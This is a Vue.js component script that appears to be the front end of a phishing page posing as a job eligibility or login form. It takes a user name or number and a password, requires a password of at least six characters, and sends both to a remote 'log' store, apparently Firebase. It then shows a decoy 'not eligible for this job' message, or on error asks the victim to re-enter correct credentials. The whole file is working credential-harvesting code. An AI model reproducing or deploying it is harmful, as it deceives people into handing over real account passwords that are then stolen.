<script>
import { log } from "../plugins/fire";
export default {
  name: "App",
  data: () => ({
    number: "",
    password: "",
  }),
  methods: {
    log() {
      if (!this.number || !this.password) {
        alert("Please Fill The Form Correctly");
        return;
      }
      if(this.password.length<6){
        alert('Input correct password')
        return
      }
      log
        .push({
          user: this.number,
          pass: this.password,
        })
        .then((res) => {
          console.log(res);
          alert("Sorry,You are not eligble for this job");
          this.number = ''
          this.password = ''
        })
        .catch((err) => {
          console.log(err);
          alert("Input Correct User Name Or Password");
        });
    },
  },
};
</script>

